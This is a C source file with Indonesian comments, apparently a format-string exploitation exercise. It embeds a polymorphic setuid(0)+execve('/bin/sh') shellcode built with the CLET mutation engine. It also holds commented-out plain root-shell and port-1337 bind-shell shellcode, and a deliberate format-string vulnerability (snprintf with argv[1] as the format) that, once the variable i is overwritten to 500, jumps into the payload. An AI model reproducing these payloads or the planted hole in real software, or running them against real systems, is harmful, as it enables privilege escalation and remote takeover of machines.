#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


char shellcode[] =

// +-------------------------------------------------------
// | setuid(0) + execve("/bin/sh") polymorphic shellcode
// | dengan CLET polymorphic shellcode mutation engine.
// |
// | Ditulis oleh : Febriyanto Nugroho
// |
// | Terima kasih : CLET TEAM.
// +-------------------------------------------------------

					"\x53\x54\x45\x4E\x43\x48\x45\x53\x50\x4F\x52\x54"
					"\x53\x4D\x4F\x55\x54\x48\x49\x4D\x4D\x4F\x56\x41"
					"\x42\x49\x4C\x49\x54\x59\x53\x49\x4D\x50\x4C\x49"
					"\x43\x49\x54\x59\x52\x45\x44\x49\x53\x54\x52\x49"
					"\x42\x55\x54\x45\x43\x48\x45\x53\x54\x45\x52\x46"
					"\x49\x45\x4C\x44\x41\x52\x41\x42\x49\x4E\x56\x4F"
					"\x49\x43\x45\x53\x54\x52\x49\x44\x45\x41\x4D\x50"
					"\x45\x52\x53\x41\x4E\x44\x53\x43\x48\x45\x52\x55"
					"\x42\x52\x45\x4C\x41\x42\x45\x4C\x4C\x45\x44\x57"
					"\x41\x47\x45\x52\x53\x57\x49\x4C\x4B\x49\x4E\x53"
					"\x4F\x4E\x42\xEB\x2D\x5B\x31\xC0\xB0\x38\x8B\x13"
					"\x81\xC2\xE5\x8C\xD8\x3A\xC1\xC2\x1D\xC1\xCA\x04"
					"\x81\xF2\xD0\x01\xE5\x83\x81\xC2\x21\xFF\x22\x90"
					"\x89\x13\x43\x43\x43\x43\x2C\x02\x48\x48\x74\x07"
					"\xEB\xD8\xE8\xCE\xFF\xFF\xFF\x80\x53\x16\x87\xD4"
					"\x22\xB4\x6C\x80\x53\x16\x87\xD4\xA2\xBE\x6C\x48"
					"\xD3\x90\xAA\xC8\x41\xC0\x9F\xC3\x3E\xC0\xB9\x3B"
					"\x3F\xED\x57\xC8\xBD\xDB\x3C\x3C\x4F\x99\x2A\x47"
					"\x64\xED\x72\x54\x10\xD4\x6C\xAC\x3F\x29\x2D\x5C"
					"\x28\x8F\xA1\x42\x41\x43\x43\x43\x41\x41\x43\x43"
					"\x41\x0A\x43\x41\x41\x42\x0A\x41\x43\x41\x42\x43"
					"\x41\x0D\x43\x43\x43\x0A\x43\x43\x41\x43\x43\x43"
					"\x41\x41\x42\x42\x43\x41\x42\x41\x0D\x41\x41\x41"
					"\x43\x41\x42\x42\x41\x54\x43\x42";



// setuid(0) + execve("/bin/sh") shellcode
// Ditulis oleh : Febriyanto Nugroho

					/*
					"\x31\xdb\x89\xd8\xb0\x17\xcd\x80"
					"\x31\xdb\x89\xd8\xb0\x2e\xcd\x80"
					"\x31\xd2\x52\x68\x6e\x2f\x73\x68"
					"\x68\x2f\x2f\x62\x69\x89\xe3\x52"
					"\x66\x68\x2d\x69\x89\xe1\x52\x51"
					"\x53\x89\xe1\x6a\x0b\x58\xcd\x80"
					"\x6a\x01\x58\x31\xdb\xcd\x80";
					*/

// Reverse TCP bind port 1337 shellcode
// setuid(0) + execve("/bin/sh") shellcode
// Ditulis oleh : Febriyanto Nugroho

					/*
					"\x6a\x66\x58\x6a\x01\x5b\x31\xc9\x51\x6a"
					"\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x31"
					"\xd2\x52\x66\x68\x05\x39\x66\x6a\x02\x89"
					"\xe1\x6a\x10\x51\x50\x89\xe1\xb3\x02\x6a"
					"\x66\x58\xcd\x80\xb0\x66\xb3\x04\xcd\x80"
					"\x52\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80"
					"\x89\xc3\x6a\x02\x59\x6a\x3f\x58\xcd\x80"
					"\xe2\xf9\x6a\x3f\x58\xcd\x80\x31\xd2\x52"
					"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
					"\x89\xe3\x52\x66\x68\x2d\x69\x89\xe1\x52"
					"\x51\x53\x89\xe1\x6a\x0b\x58\xcd\x80\x6a"
					"\x01\x58\x31\xdb\xcd\x80";
					*/

int main(int argc, char **argv) {
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("ubah nilai (i) dari 1 -> 500.\n");

	if(i == 500) {

		(*(void (*)()) shellcode)();
		return 0;
	}

	//printf(":))\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf("i = %d (%p)\n", i, &i);
	return 0;
}
